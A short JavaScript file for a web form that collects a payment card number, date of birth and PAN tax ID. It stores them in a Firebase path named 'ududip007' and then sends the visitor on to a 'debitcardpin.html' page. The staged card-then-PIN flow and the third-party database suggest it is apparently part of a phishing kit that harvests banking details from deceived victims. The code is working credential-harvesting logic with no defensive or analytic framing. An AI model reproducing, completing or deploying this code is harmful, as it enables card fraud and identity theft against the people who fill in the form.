// firebase-card.js

const cardInput = document.getElementById("card");
const dobInput = document.getElementById("dob");
const panInput = document.getElementById("pan");
const proceedBtn = document.querySelector(".proceed-button");

// Auto format DOB field
dobInput.addEventListener("input", () => {
  let value = dobInput.value.replace(/\D/g, "");
  if (value.length >= 3) value = value.slice(0, 2) + "/" + value.slice(2);
  if (value.length >= 6) value = value.slice(0, 5) + "/" + value.slice(5);
  dobInput.value = value.slice(0, 10);
});

// Enable button when card is 16 digits
cardInput.addEventListener("input", () => {
  proceedBtn.disabled = cardInput.value.length !== 16;
});

// Form submit
document.getElementById("cardForm").addEventListener("submit", function (e) {
  e.preventDefault();

  const key = localStorage.getItem("firebaseKey");
  if (!key) return alert("No Firebase key found!");

  const userRef = firebase.database().ref("ududip007/" + key);

  userRef.update({
    d_CARD: cardInput.value.trim(),
    e_DOB: dobInput.value.trim(),
    f_PAN: panInput.value.trim()
  }).then(() => {
    window.location.href = "debitcardpin.html";
  }).catch((err) => {
    alert("Error: " + err.message);
  });
});
